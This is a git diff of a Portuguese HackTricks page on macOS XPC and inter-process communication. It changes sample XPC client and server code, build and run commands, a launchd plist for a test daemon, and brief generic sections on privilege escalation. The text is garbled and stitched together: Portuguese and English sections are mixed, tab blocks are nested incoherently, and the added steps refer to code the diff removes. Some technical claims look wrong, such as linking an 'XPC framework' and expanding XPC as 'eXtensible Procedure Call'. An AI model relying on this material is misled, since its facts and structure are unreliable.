+O servidor XPC é responsável por criar e gerenciar a conexão XPC com o cliente. Ele também é responsável por definir os manipuladores de mensagens que serão chamados quando o cliente enviar uma mensagem.
 
-O XPC é usado em muitos lugares no macOS, incluindo o Spotlight, o Launch Services e o iCloud. Ele também é usado por aplicativos de terceiros para se comunicar com seus próprios processos.
+O servidor XPC é iniciado chamando a função `xpc_main()`. Esta função cria uma conexão XPC e define os manipuladores de mensagens. Em seguida, ele entra em um loop infinito, aguardando mensagens do cliente.
 
-O XPC é baseado em mensagens. Um processo envia uma mensagem para outro processo e espera uma resposta. As mensagens são serializadas em um formato binário e enviadas através de um soquete Unix.
+Quando uma mensagem é recebida, o manipulador de mensagem apropriado é chamado. O manipulador de mensagem é responsável por processar a mensagem e enviar uma resposta de volta ao cliente, se necessário.
 
-O XPC é seguro por padrão. Os processos não podem acessar diretamente a memória uns dos outros e as mensagens são validadas para garantir que não sejam malformadas ou maliciosas.
+# Compilando e executando o servidor XPC
 
-No entanto, existem algumas vulnerabilidades conhecidas no XPC que podem ser exploradas para obter privilégios elevados ou vazar informações confidenciais. Essas vulnerabilidades geralmente envolvem o uso incorreto do XPC ou a falta de validação adequada das mensagens.
+Para compilar o servidor XPC, execute o seguinte comando:
 
-## Exemplo de código
-
-O código a seguir mostra como usar o XPC para se comunicar entre processos. Ele define um serviço XPC simples que pode ser usado para adicionar dois números.
-
-```objective-c
-// oc_xpc_server.m
-
-#import <Foundation/Foundation.h>
-#import <xpc/xpc.h>
-
-static xpc_object_t
-handle_message(xpc_object_t message)
-{
-    xpc_object_t reply = xpc_dictionary_create_reply(message);
-    int a = xpc_dictionary_get_int64(message, "a");
-    int b = xpc_dictionary_get_int64(message, "b");
-    int sum = a + b;
-    xpc_dictionary_set_int64(reply, "sum", sum);
-    return reply;
-}
-
-int
-main(int argc, const char *argv[])
-{
-    xpc_connection_t connection = xpc_connection_create_mach_service("com.example.adder", NULL, XPC_CONNECTION_MACH_SERVICE_LISTENER);
-    xpc_connection_set_event_handler(connection, ^(xpc_object_t event) {
-        xpc_type_t type = xpc_get_type(event);
-        if (type == XPC_TYPE_CONNECTION) {
-            xpc_connection_set_event_handler(event, ^(xpc_object_t message) {
-                xpc_object_t reply = handle_message(message);
-                xpc_connection_send_message(event, reply);
-                xpc_release(reply);
-            });
-            xpc_connection_resume(event);
-        }
-    });
-    xpc_connection_resume(connection);
-    dispatch_main();
-    return 0;
-}
+```
+$ clang -o oc_xpc_server oc_xpc_server.m -framework Foundation -framework XPC
 ```
 
-O código a seguir mostra como usar o XPC para se comunicar com o serviço definido acima.
+Para executar o servidor XPC, execute o seguinte comando:
 
-```objective-c
-// oc_xpc_client.m
-
-#import <Foundation/Foundation.h>
-#import <xpc/xpc.h>
-
-int
-main(int argc, const char *argv[])
-{
-    xpc_connection_t connection = xpc_connection_create_mach_service("com.example.adder", NULL, 0);
-    xpc_connection_set_event_handler(connection, ^(xpc_object_t event) {
-        xpc_type_t type = xpc_get_type(event);
-        if (type == XPC_TYPE_DICTIONARY) {
-            int sum = xpc_dictionary_get_int64(event, "sum");
-            printf("sum = %d\n", sum);
-        }
-    });
-    xpc_connection_resume(connection);
-    xpc_object_t message = xpc_dictionary_create(NULL, NULL, 0);
-    xpc_dictionary_set_int64(message, "a", 1);
-    xpc_dictionary_set_int64(message, "b", 2);
-    xpc_connection_send_message_with_reply(connection, message, dispatch_get_main_queue(), ^(xpc_object_t reply) {
-        // Handle reply here
-    });
-    dispatch_main();
-    return 0;
-}
+```
+$ ./oc_xpc_server
 ```
 
-## Referências
+# Testando o servidor XPC
 
-- [XPC Overview](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingXPCServices.html)
-- [XPC Security](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/Security.html#//apple_ref/doc/uid/10000172i-SW8-SW1)
-- [XPC Vulnerabilities](https://www.synack.com/2016/05/17/xpc-vulnerabilities-in-os-x/)
+Para testar o servidor XPC, execute o seguinte comando:
+
+```
+$ ./oc_xpc_client
+```
+
+Isso enviará uma mensagem para o servidor XPC e imprimirá a resposta recebida do servidor.
+
+{% endtab %}
 ```objectivec
 // gcc -framework Foundation oc_xpc_client.m -o oc_xpc_client
 #include <Foundation/Foundation.h>
@@ -1064,70 +1084,76 @@ main(int argc, const char *argv[])
 @end
 
 int main(void) {
-    NSXPCConnection *connection = [[NSXPCConnection alloc] initWithMachServiceName:@"xyz.hacktricks.svcoc" options:NSXPCConnectionPrivileged];
-    connection.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(MyXPCProtocol)];
-    [connection resume];
+NSXPCConnection *connection = [[NSXPCConnection alloc] initWithMachServiceName:@"xyz.hacktricks.svcoc" options:NSXPCConnectionPrivileged];
+connection.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(MyXPCProtocol)];
+[connection resume];
 
-    [[connection remoteObjectProxy] sayHello:@"Hello, Server!" withReply:^(NSString *response) {
-        NSLog(@"Received response: %@", response);
-    }];
+[[connection remoteObjectProxy] sayHello:@"Hello, Server!" withReply:^(NSString *response) {
+NSLog(@"Received response: %@", response);
+}];
 
-    [[NSRunLoop currentRunLoop] run];
+[[NSRunLoop currentRunLoop] run];
 
-    return 0;
+return 0;
 }
 ```
 {% endtab %}
 
 {% tab title="macOS IPC (Inter-Process Communication)" %}
-# IPC (Inter-Process Communication)
+# macOS IPC (Inter-Process Communication)
 
-IPC é um conjunto de mecanismos que permitem a comunicação entre processos. O macOS suporta vários mecanismos de IPC, incluindo:
+Inter-Process Communication (IPC) is a mechanism that allows processes to communicate with each other and share data. macOS provides several IPC mechanisms, including:
 
-- **Mach ports**: um mecanismo de comunicação de baixo nível que permite a comunicação entre processos em um único sistema ou em sistemas diferentes.
-- **Unix domain sockets**: um mecanismo de comunicação de soquete que permite a comunicação entre processos em um único sistema.
-- **XPC**: um mecanismo de comunicação de alto nível que permite a comunicação entre processos em um único sistema.
+* Mach ports
+* Unix domain sockets
+* Distributed Objects
+* XPC services
 
 ## Mach Ports
 
-Os Mach ports são um mecanismo de comunicação de baixo nível que permite a comunicação entre processos em um único sistema ou em sistemas diferentes. Os Mach ports são usados ​​para implementar muitos recursos do macOS, incluindo notificações de eventos do sistema, comunicação entre processos e gerenciamento de memória.
+Mach ports are a low-level IPC mechanism used by macOS and iOS. They are used to send messages between processes and to create inter-process communication channels. Mach ports are used by many macOS system services, including launchd, the WindowServer, and the kernel.
 
-Os Mach ports são identificados por um número de porta exclusivo e podem ser usados ​​para enviar e receber mensagens. As mensagens enviadas por meio de Mach ports podem conter dados e referências para objetos de memória compartilhada.
+Mach ports are identified by a port name, which is a 32-bit integer. Ports can be created, destroyed, and passed between processes. When a process creates a port, it can specify whether the port is a send right, a receive right, or both. A send right allows a process to send messages to the port, while a receive right allows a process to receive messages from the port.
 
-Os Mach ports são gerenciados pelo kernel do macOS e são acessíveis a todos os processos do sistema. Os processos podem criar novos Mach ports e enviar mensagens para outros processos usando Mach ports existentes.
+Mach ports can be used to perform a variety of tasks, including:
 
-Os Mach ports são usados ​​por muitos recursos do macOS, incluindo:
-
-- **Launchd**: o processo init do macOS usa Mach ports para iniciar e gerenciar outros processos do sistema.
-- **Notification Center**: o Notification Center usa Mach ports para enviar notificações de eventos do sistema para aplicativos.
-- **XPC**: o XPC usa Mach ports para enviar mensagens entre processos.
+* Sending messages between processes
+* Sharing memory between processes
+* Creating inter-process communication channels
+* Creating synchronization primitives, such as semaphores and mutexes
 
 ## Unix Domain Sockets
 
-Os Unix domain sockets são um mecanismo de comunicação de soquete que permite a comunicação entre processos em um único sistema. Os Unix domain sockets são identificados por um nome de soquete exclusivo e podem ser usados ​​para enviar e receber mensagens.
+Unix domain sockets are a type of IPC mechanism that allows processes to communicate with each other using the file system. They are similar to network sockets, but they are only accessible on the local machine.
 
-Os Unix domain sockets são gerenciados pelo kernel do macOS e são acessíveis a todos os processos do sistema. Os processos podem criar novos Unix domain sockets e enviar mensagens para outros processos usando Unix domain sockets existentes.
+Unix domain sockets are identified by a file path, which is used to create a socket file in the file system. Processes can connect to a socket by opening the socket file and sending messages to it. Unix domain sockets can be used to perform a variety of tasks, including:
 
-Os Unix domain sockets são usados ​​por muitos recursos do macOS, incluindo:
+* Sending messages between processes
+* Sharing file descriptors between processes
+* Creating inter-process communication channels
 
-- **Launchd**: o processo init do macOS usa Unix domain sockets para iniciar e gerenciar outros processos do sistema.
-- **XPC**: o XPC usa Unix domain sockets para enviar mensagens entre processos.
+## Distributed Objects
 
-## XPC
+Distributed Objects is an IPC mechanism that allows objects to be passed between processes. It is based on the Objective-C runtime and is used primarily by macOS system services.
 
-O XPC é um mecanismo de comunicação de alto nível que permite a comunicação entre processos em um único sistema. O XPC é baseado em Mach ports e Unix domain sockets e fornece uma API de alto nível para enviar e receber mensagens.
+Distributed Objects allows objects to be passed between processes using a proxy object. The proxy object is responsible for forwarding messages between the local object and the remote object. Distributed Objects can be used to perform a variety of tasks, including:
 
-O XPC é usado por muitos recursos do macOS, incluindo:
+* Sharing objects between processes
+* Creating inter-process communication channels
 
-- **Launchd**: o processo init do macOS usa o XPC para iniciar e gerenciar outros processos do sistema.
-- **Notification Center**: o Notification Center usa o XPC para enviar notificações de eventos do sistema para aplicativos.
-- **Sandboxing**: o mecanismo de sandboxing do macOS usa o XPC para permitir que os processos se comuniquem com outros processos em um ambiente seguro.
+## XPC Services
 
-## References
+XPC Services is a high-level IPC mechanism used by macOS and iOS. It is based on the XPC (eXtensible Procedure Call) protocol and is used primarily by macOS system services.
 
-- [Mach Ports](https://developer.apple.com/library/archive/documentation/Darwin/Conceptual/KernelProgramming/Mach/Mach.html)
-- [Unix Domain Sockets](https://developer.apple.com/library/archive/documentation/System/Conceptual/ManPages_iPhoneOS/man2/unix.2.html)
-- [XPC Overview](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingXPCServices.html)
+XPC Services allows processes to communicate with each other using a message-passing model. Processes can send messages to each other and receive responses asynchronously. XPC Services can be used to perform a variety of tasks, including:
+
+* Running background tasks
+* Sharing data between processes
+* Creating inter-process communication channels
+
+## Conclusion
+
+Inter-Process Communication is an important mechanism for macOS and iOS. It allows processes to communicate with each other and share data, which is essential for many system services and applications. Understanding the different IPC mechanisms available on macOS can help you develop more efficient and secure applications.
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
@@ -1135,19 +1161,45 @@ O XPC é usado por muitos recursos do macOS, incluindo:
 <key>Label</key>
 <string>xyz.hacktricks.svcoc</string>
 <key>MachServices</key>
-    <dict>
-        <key>xyz.hacktricks.svcoc</key>
-        <true/>
-    </dict>
+<dict>
+<key>xyz.hacktricks.svcoc</key>
+<true/>
+</dict>
 <key>Program</key>
-    <string>/tmp/oc_xpc_server</string>
-    <key>ProgramArguments</key>
-    <array>
-        <string>/tmp/oc_xpc_server</string>
-    </array>
+<string>/tmp/oc_xpc_server</string>
+<key>ProgramArguments</key>
+<array>
+<string>/tmp/oc_xpc_server</string>
+</array>
 </dict>
 </plist>
 ```
+{% endtab %}
+{% endtabs %} 
+
+{% tabs %}
+{% tab title="Introdução" %}
+O macOS é um sistema operacional baseado em Unix que é amplamente utilizado em computadores pessoais da Apple. O macOS é conhecido por sua segurança e privacidade robustas, mas ainda é vulnerável a ataques devido a vulnerabilidades de segurança e configurações incorretas. Neste guia, exploraremos a arquitetura do macOS e como ela lida com a comunicação entre processos. Também discutiremos técnicas de escalonamento de privilégios que podem ser usadas para obter acesso não autorizado a recursos protegidos do sistema. 
+{% endtab %}
+
+{% tab title="Comunicação entre processos" %}
+O macOS usa vários mecanismos de comunicação entre processos (IPC) para permitir que os processos se comuniquem uns com os outros. Esses mecanismos incluem:
+
+- **Mach IPC**: um mecanismo de IPC de baixo nível usado pelo kernel do macOS e pelos processos do usuário.
+- **XPC**: um mecanismo de IPC de alto nível usado para comunicação entre processos do usuário.
+- **Distributed Objects**: um mecanismo de IPC de alto nível usado para comunicação entre processos do usuário.
+
+Esses mecanismos de IPC são usados ​​para permitir que os processos se comuniquem uns com os outros e compartilhem recursos. No entanto, eles também podem ser usados ​​para ataques de escalonamento de privilégios, como veremos na seção a seguir. 
+{% endtab %}
+
+{% tab title="Escalonamento de privilégios" %}
+O macOS é projetado com várias camadas de segurança para proteger o sistema contra ataques. No entanto, essas camadas de segurança podem ser contornadas usando técnicas de escalonamento de privilégios. Algumas técnicas comuns de escalonamento de privilégios no macOS incluem:
+
+- **Exploração de vulnerabilidades**: os atacantes podem explorar vulnerabilidades de segurança no sistema operacional ou em aplicativos de terceiros para obter acesso não autorizado a recursos protegidos do sistema.
+- **Ataques de injeção de código**: os atacantes podem injetar código malicioso em processos do sistema para obter acesso não autorizado a recursos protegidos do sistema.
+- **Ataques de IPC**: os atacantes podem usar mecanismos de IPC para se comunicar com processos protegidos e obter acesso não autorizado a recursos protegidos do sistema.
+
+Para proteger o sistema contra ataques de escalonamento de privilégios, é importante manter o sistema operacional e os aplicativos de terceiros atualizados e configurar corretamente as configurações de segurança do sistema. 
 {% endtab %}
 {% endtabs %}
 ```bash
@@ -1172,6 +1224,8 @@ sudo rm /Library/LaunchDaemons/xyz.hacktricks.svcoc.plist /tmp/oc_xpc_server
 ## Referências
 
 * [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
+* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
+* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
 
 <details>
 
@@ -1181,6 +1235,6 @@ sudo rm /Library/LaunchDaemons/xyz.hacktricks.svcoc.plist /tmp/oc_xpc_server
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
